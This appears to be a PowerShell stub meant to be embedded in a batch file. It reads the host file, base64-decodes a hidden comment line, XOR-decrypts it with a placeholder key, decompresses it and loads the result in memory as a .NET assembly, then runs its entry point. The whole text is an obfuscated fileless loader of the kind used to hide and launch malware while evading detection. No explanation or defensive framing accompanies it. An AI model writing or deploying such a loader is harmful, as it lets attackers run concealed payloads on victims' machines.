$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
foreach ($line_var in $contents_var) { if ($line_var.StartsWith(':: ')) {  $lastline_var = $line_var.Substring(3); break; }; };
$payload_var = [System.Convert]::FromBase64String($lastline_var);
$key_var = [System.Convert]::FromBase64String('DECRYPTION_KEY');
for ($i = 0; $i -le $payload_var.Length - 1; $i++) { $payload_var[$i] = ($payload_var[$i] -bxor $key_var[$i %% $key_var.Length]); };
$msi_var = New-Object System.IO.MemoryStream(, $payload_var);
$mso_var = New-Object System.IO.MemoryStream;
$gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
$gs_var.CopyTo($mso_var);
$gs_var.Dispose();
$msi_var.Dispose();
$mso_var.Dispose();
$payload_var = $mso_var.ToArray();
$obfstep1_var = [System.Reflection.Assembly]::Load($payload_var);
$obfstep2_var = $obfstep1_var.EntryPoint;
$obfstep2_var.Invoke($null, (, [string[]] ('%*')))